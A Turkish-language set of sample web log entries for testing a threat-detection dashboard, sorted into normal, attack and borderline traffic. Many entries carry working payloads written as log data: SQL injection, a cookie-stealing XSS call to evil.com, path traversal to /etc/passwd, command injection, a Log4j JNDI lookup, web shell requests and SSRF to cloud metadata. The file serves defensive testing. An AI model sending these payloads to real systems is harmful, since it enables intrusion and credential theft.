# Test Web Logları - Dashboard Formatında

Aşağıdaki web loglarını kopyala-yapıştır ile test edebilirsin.

---

## 🟢 NORMAL (MEŞRU) WEB TRAFİĞİ

### 1. Normal Sayfa Görüntüleme
| Alan | Değer |
|------|-------|
| **IP Address** | 192.168.1.100 |
| **Log Entry** | GET /index.html HTTP/1.1 200 1234 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0" |

---

### 2. CSS/JS İstekleri
| Alan | Değer |
|------|-------|
| **IP Address** | 10.0.0.50 |
| **Log Entry** | GET /static/css/styles.css HTTP/1.1 200 5678 "Mozilla/5.0 Firefox/121.0" |

---

### 3. API Çağrısı
| Alan | Değer |
|------|-------|
| **IP Address** | 172.16.0.25 |
| **Log Entry** | POST /api/users/login HTTP/1.1 200 256 "Mozilla/5.0 Chrome/120.0.0.0" |

---

### 4. Resim İsteği
| Alan | Değer |
|------|-------|
| **IP Address** | 192.168.1.150 |
| **Log Entry** | GET /images/logo.png HTTP/1.1 200 45678 "Mozilla/5.0 Safari/17.0" |

---

### 5. Normal Arama
| Alan | Değer |
|------|-------|
| **IP Address** | 10.0.0.75 |
| **Log Entry** | GET /search?q=product+reviews HTTP/1.1 200 8901 "Mozilla/5.0 Chrome/120.0.0.0" |

---

### 6. Form Gönderimi
| Alan | Değer |
|------|-------|
| **IP Address** | 172.16.0.100 |
| **Log Entry** | POST /contact HTTP/1.1 200 128 "Mozilla/5.0 Edge/120.0.0.0" |

---

### 7. 404 Hatası (Normal)
| Alan | Değer |
|------|-------|
| **IP Address** | 192.168.1.200 |
| **Log Entry** | GET /old-page.html HTTP/1.1 404 512 "Mozilla/5.0 Chrome/120.0.0.0" |

---

## 🔴 SALDIRI (THREAT) WEB TRAFİĞİ

### 8. SQL Injection Saldırısı
| Alan | Değer |
|------|-------|
| **IP Address** | 185.143.223.50 |
| **Log Entry** | GET /products?id=1' OR '1'='1'-- HTTP/1.1 200 5678 "sqlmap/1.5" |

---

### 9. SQL Injection - UNION
| Alan | Değer |
|------|-------|
| **IP Address** | 91.134.125.89 |
| **Log Entry** | GET /users?id=1 UNION SELECT username,password FROM users-- HTTP/1.1 500 1234 "Mozilla/5.0" |

---

### 10. XSS Saldırısı
| Alan | Değer |
|------|-------|
| **IP Address** | 45.33.32.156 |
| **Log Entry** | GET /search?q=<script>alert('XSS')</script> HTTP/1.1 200 4567 "Mozilla/5.0" |

---

### 11. XSS - Cookie Hırsızlığı
| Alan | Değer |
|------|-------|
| **IP Address** | 103.224.182.240 |
| **Log Entry** | GET /comment?text=<script>document.location='http://evil.com/steal?c='+document.cookie</script> HTTP/1.1 200 890 |

---

### 12. Path Traversal Saldırısı
| Alan | Değer |
|------|-------|
| **IP Address** | 185.220.101.33 |
| **Log Entry** | GET /download?file=../../../etc/passwd HTTP/1.1 200 1234 "curl/7.68.0" |

---

### 13. Path Traversal - Windows
| Alan | Değer |
|------|-------|
| **IP Address** | 77.247.181.162 |
| **Log Entry** | GET /files?path=....//....//....//windows/system32/config/sam HTTP/1.1 403 256 |

---

### 14. Command Injection
| Alan | Değer |
|------|-------|
| **IP Address** | 195.123.226.72 |
| **Log Entry** | POST /admin/ping HTTP/1.1 200 512 "8.8.8.8; cat /etc/passwd" |

---

### 15. Command Injection - Pipe
| Alan | Değer |
|------|-------|
| **IP Address** | 45.155.205.233 |
| **Log Entry** | GET /status?host=localhost|whoami HTTP/1.1 200 128 "Mozilla/5.0" |

---

### 16. Admin Panel Brute Force
| Alan | Değer |
|------|-------|
| **IP Address** | 185.156.73.54 |
| **Log Entry** | POST /admin/login HTTP/1.1 401 64 "Mozilla/5.0" username=admin&password=password123 |

---

### 17. Directory Scanning
| Alan | Değer |
|------|-------|
| **IP Address** | 91.219.236.166 |
| **Log Entry** | GET /wp-admin/ HTTP/1.1 404 128 "DirBuster-1.0-RC1" |

---

### 18. PhpMyAdmin Taraması
| Alan | Değer |
|------|-------|
| **IP Address** | 62.210.180.80 |
| **Log Entry** | GET /phpmyadmin/index.php HTTP/1.1 404 256 "Nikto/2.1.6" |

---

### 19. Log4j Exploitation
| Alan | Değer |
|------|-------|
| **IP Address** | 45.146.165.37 |
| **Log Entry** | GET / HTTP/1.1 200 1024 "${jndi:ldap://evil.com/exploit}" |

---

### 20. Shell Upload Denemesi
| Alan | Değer |
|------|-------|
| **IP Address** | 193.142.146.35 |
| **Log Entry** | POST /upload.php HTTP/1.1 200 512 "Mozilla/5.0" filename="shell.php" |

---

### 21. Backdoor Erişimi
| Alan | Değer |
|------|-------|
| **IP Address** | 185.220.100.252 |
| **Log Entry** | GET /c99.php?cmd=id HTTP/1.1 200 64 "Mozilla/5.0" |

---

### 22. WordPress Exploit
| Alan | Değer |
|------|-------|
| **IP Address** | 77.72.83.42 |
| **Log Entry** | GET /wp-content/plugins/revslider/temp/update_extract/revslider/.../shell.php HTTP/1.1 200 128 |

---

### 23. Server-Side Request Forgery (SSRF)
| Alan | Değer |
|------|-------|
| **IP Address** | 141.98.10.60 |
| **Log Entry** | GET /proxy?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1 200 2048 |

---

### 24. Credential Harvesting
| Alan | Değer |
|------|-------|
| **IP Address** | 45.142.120.93 |
| **Log Entry** | GET /login?redirect=http://evil-phishing.com/fake-login HTTP/1.1 302 128 |

---

## 🟡 ŞÜPHELİ (BORDERLINE) TRAFİK

### 25. Yüksek Frekanslı İstek
| Alan | Değer |
|------|-------|
| **IP Address** | 192.168.1.50 |
| **Log Entry** | GET /api/data HTTP/1.1 200 1024 "Python-urllib/3.9" (500 requests/min) |

---

### 26. Unusual User-Agent
| Alan | Değer |
|------|-------|
| **IP Address** | 10.0.0.200 |
| **Log Entry** | GET /robots.txt HTTP/1.1 200 256 "Googlebot/2.1 (compatible)" |

---

### 27. Encoded URL
| Alan | Değer |
|------|-------|
| **IP Address** | 172.16.0.150 |
| **Log Entry** | GET /page?data=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1 200 1024 |

---

### 28. Sensitive File Access
| Alan | Değer |
|------|-------|
| **IP Address** | 192.168.1.75 |
| **Log Entry** | GET /.git/config HTTP/1.1 403 128 "Mozilla/5.0 Chrome/120.0.0.0" |

---

### 29. API Rate Limit
| Alan | Değer |
|------|-------|
| **IP Address** | 10.0.0.100 |
| **Log Entry** | GET /api/users HTTP/1.1 429 64 "PostmanRuntime/7.32.0" |

---

### 30. Large File Download
| Alan | Değer |
|------|-------|
| **IP Address** | 172.16.0.200 |
| **Log Entry** | GET /backup/database.sql HTTP/1.1 200 104857600 "wget/1.21" |

---

## 📋 HIZLI TEST İÇİN TEK SATIRLIK LOGLAR

### Normal Trafik:
```
GET /index.html HTTP/1.1 200 1234 "Mozilla/5.0 Chrome/120.0.0.0"
```

### SQL Injection:
```
GET /products?id=1' OR '1'='1'-- HTTP/1.1 200 5678 "sqlmap/1.5"
```

### XSS Saldırısı:
```
GET /search?q=<script>alert('XSS')</script> HTTP/1.1 200 4567
```

### Path Traversal:
```
GET /download?file=../../../etc/passwd HTTP/1.1 200 1234
```

### Command Injection:
```
POST /admin/ping HTTP/1.1 200 "8.8.8.8; cat /etc/passwd"
```

### Brute Force:
```
POST /admin/login HTTP/1.1 401 username=admin&password=admin123
```

---

## 🎯 SALDIRI TÜRLERİ ÖZETİ

| Saldırı Türü | Örnek Pattern | Risk |
|-------------|---------------|------|
| **SQL Injection** | `' OR '1'='1`, `UNION SELECT`, `--` | 🔴 Yüksek |
| **XSS** | `<script>`, `onerror=`, `javascript:` | 🔴 Yüksek |
| **Path Traversal** | `../`, `..\\`, `%2e%2e/` | 🔴 Yüksek |
| **Command Injection** | `; cat`, `| whoami`, `` `id` `` | 🔴 Yüksek |
| **Directory Scanning** | `/wp-admin/`, `/phpmyadmin/`, `.git/` | 🟡 Orta |
| **Brute Force** | Multiple 401/403 from same IP | 🟡 Orta |
| **Bot Traffic** | Unusual User-Agent, High frequency | 🟡 Orta |

---

## 💡 KULLANIM İPUÇLARI

1. **IP Address alanı:** Saldırgan IP'si olarak dış IP'ler kullan (185.x.x.x, 91.x.x.x)
2. **Log Entry alanı:** Tam HTTP log formatında gir
3. **Suspicious keywords:** `SELECT`, `UNION`, `script`, `../`, `;`, `|` gibi keywordler yüksek skor tetikler
4. **User-Agent:** `sqlmap`, `nikto`, `DirBuster` gibi araçlar şüpheli olarak işaretlenir
